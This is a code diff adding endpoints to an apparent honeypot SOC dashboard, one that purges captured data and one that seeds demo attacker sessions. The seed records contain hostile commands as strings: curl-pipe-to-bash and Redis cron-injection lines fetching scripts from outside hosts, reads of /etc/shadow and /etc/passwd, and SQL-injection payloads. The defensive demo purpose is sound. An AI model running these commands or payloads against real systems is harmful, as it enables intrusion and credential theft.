@@ -248,6 +248,174 @@ def get_stats_overview(db: Session = Depends(database.get_db)):
         "top_commands": top_commands
     }
 
+@app.delete("/api/data/clear")
+def clear_all_captured_data(db: Session = Depends(database.get_db)):
+    """
+    Clears all captured attacker sessions, telemetry events, and triggered decoys.
+    Resets the SOC dashboard to a clean zero state.
+    """
+    try:
+        deleted_events = db.query(models.EventModel).delete()
+        deleted_sessions = db.query(models.SessionModel).delete()
+        db.query(models.DecoyModel).update({models.DecoyModel.status: "inactive", models.DecoyModel.triggered_by_session: None, models.DecoyModel.activated_at: None})
+        db.commit()
+        return {
+            "status": "success",
+            "message": "All captured threat telemetry and attacker sessions have been purged.",
+            "deleted_sessions": deleted_sessions,
+            "deleted_events": deleted_events
+        }
+    except Exception as e:
+        db.rollback()
+        raise HTTPException(status_code=500, detail=f"Failed to clear database: {str(e)}")
+
+@app.post("/api/data/seed")
+def seed_example_data(db: Session = Depends(database.get_db)):
+    """
+    Populates realistic attacker sessions, credentials, geolocations, and MITRE commands for demonstration.
+    """
+    try:
+        import uuid
+        sample_sessions = [
+            {
+                "id": "sess-live-ssh-01",
+                "ip_address": "185.220.101.5",
+                "protocol": "SSH",
+                "country": "Germany",
+                "city": "Frankfurt",
+                "latitude": 50.1109,
+                "longitude": 8.6821,
+                "username_attempted": "root",
+                "password_attempted": "admin1234",
+                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=4),
+                "ended_at": None,
+                "events": [
+                    ("login_attempt", "root / admin1234", "Accepted password for root from 185.220.101.5 port 52344 ssh2", "SSH"),
+                    ("command_execution", "uname -a", "Linux prod-web-srv-01 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 x86_64 GNU/Linux", "SSH"),
+                    ("command_execution", "whoami", "root", "SSH"),
+                    ("command_execution", "cat /etc/shadow", "root:$6$Z8sK1xQ...:18900:0:99999:7:::\ndaemon:*:18885:0:99999:7:::", "SSH"),
+                    ("command_execution", "curl -s http://185.220.101.5/stage2.sh | bash", "Resolving host... Downloading payload (14.2 KB)... Staged in /tmp/.sys_update", "SSH"),
+                    ("command_execution", "crontab -l", "no crontab for root", "SSH"),
+                ]
+            },
+            {
+                "id": "sess-live-http-02",
+                "ip_address": "194.26.29.114",
+                "protocol": "HTTP",
+                "country": "Netherlands",
+                "city": "Amsterdam",
+                "latitude": 52.3676,
+                "longitude": 4.9041,
+                "username_attempted": "admin",
+                "password_attempted": "' OR '1'='1",
+                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=9),
+                "ended_at": None,
+                "events": [
+                    ("login_attempt", "admin'--", "HTTP 200 OK - Redirecting to /admin/dashboard", "HTTP"),
+                    ("command_execution", "SELECT * FROM users WHERE username='admin' UNION SELECT 1,schema_name,3 FROM information_schema.schemata--", "Trap Activated: Honeytoken DB schema accessed", "HTTP"),
+                    ("command_execution", "GET /api/v1/debug?cmd=cat%20/etc/passwd", "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin", "HTTP"),
+                ]
+            },
+            {
+                "id": "sess-live-mysql-03",
+                "ip_address": "45.155.205.233",
+                "protocol": "MySQL",
+                "country": "Russia",
+                "city": "Moscow",
+                "latitude": 55.7558,
+                "longitude": 37.6173,
+                "username_attempted": "root",
+                "password_attempted": "toor",
+                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=15),
+                "ended_at": None,
+                "events": [
+                    ("login_attempt", "root / toor", "Handshake 5.7.34-MySQL-Standard accepted", "MySQL"),
+                    ("command_execution", "SHOW DATABASES;", "information_schema\ncustomer_vault\npayments_db", "MySQL"),
+                    ("command_execution", "SELECT * FROM payments_db.credit_cards LIMIT 10;", "Trap Activated: Canary Honeytoken Triggered [DB_EXFIL_ATTEMPT]", "MySQL"),
+                ]
+            },
+            {
+                "id": "sess-live-redis-04",
+                "ip_address": "91.240.118.242",
+                "protocol": "Redis",
+                "country": "Bulgaria",
+                "city": "Sofia",
+                "latitude": 42.6977,
+                "longitude": 23.3219,
+                "username_attempted": "default",
+                "password_attempted": "none",
+                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=24),
+                "ended_at": None,
+                "events": [
+                    ("login_attempt", "unauthenticated", "Redis 6.0.9 ready", "Redis"),
+                    ("command_execution", "CONFIG SET dir /var/spool/cron/crontabs", "OK", "Redis"),
+                    ("command_execution", "CONFIG SET dbfilename root", "OK", "Redis"),
+                    ("command_execution", "SET backup '* * * * * curl http://91.240.118.242/cron.sh | sh'", "Trap Activated: Unauthorized Cron Injection", "Redis"),
+                    ("command_execution", "SAVE", "DB saved on disk", "Redis"),
+                ]
+            },
+            {
+                "id": "sess-closed-telnet-05",
+                "ip_address": "103.149.138.82",
+                "protocol": "Telnet",
+                "country": "Singapore",
+                "city": "Singapore",
+                "latitude": 1.3521,
+                "longitude": 103.8198,
+                "username_attempted": "support",
+                "password_attempted": "support123",
+                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=45),
+                "ended_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=30),
+                "events": [
+                    ("login_attempt", "support / support123", "Telnet terminal session initialized", "Telnet"),
+                    ("command_execution", "enable", "Password:", "Telnet"),
+                    ("command_execution", "sh running-config", "Building configuration... Current configuration : 1084 bytes", "Telnet"),
+                ]
+            }
+        ]
+
+        added_sessions = 0
+        for s in sample_sessions:
+            existing = db.query(models.SessionModel).filter(models.SessionModel.ip_address == s["ip_address"]).first()
+            if not existing:
+                sess_obj = models.SessionModel(
+                    id=s["id"],
+                    ip_address=s["ip_address"],
+                    protocol=s["protocol"],
+                    country=s["country"],
+                    city=s["city"],
+                    latitude=s["latitude"],
+                    longitude=s["longitude"],
+                    username_attempted=s["username_attempted"],
+                    password_attempted=s["password_attempted"],
+                    started_at=s["started_at"],
+                    ended_at=s["ended_at"]
+                )
+                db.add(sess_obj)
+                db.commit()
+                added_sessions += 1
+
+                for idx, ev in enumerate(s["events"]):
+                    ev_obj = models.EventModel(
+                        session_id=s["id"],
+                        timestamp=s["started_at"] + datetime.timedelta(seconds=(idx + 1) * 20),
+                        protocol=ev[3],
+                        event_type=ev[0],
+                        input_data=ev[1],
+                        output_data=ev[2]
+                    )
+                    db.add(ev_obj)
+                db.commit()
+
+        return {
+            "status": "success",
+            "message": f"Seeded {added_sessions} demo attacker sessions with forensic telemetry events.",
+            "total_seeded": added_sessions
+        }
+    except Exception as e:
+        db.rollback()
+        raise HTTPException(status_code=500, detail=f"Failed to seed demo data: {str(e)}")
+
 @app.get("/api/reports/export")
 def export_logs(format: str = "json", db: Session = Depends(database.get_db)):
     events = db.query(models.EventModel).all()
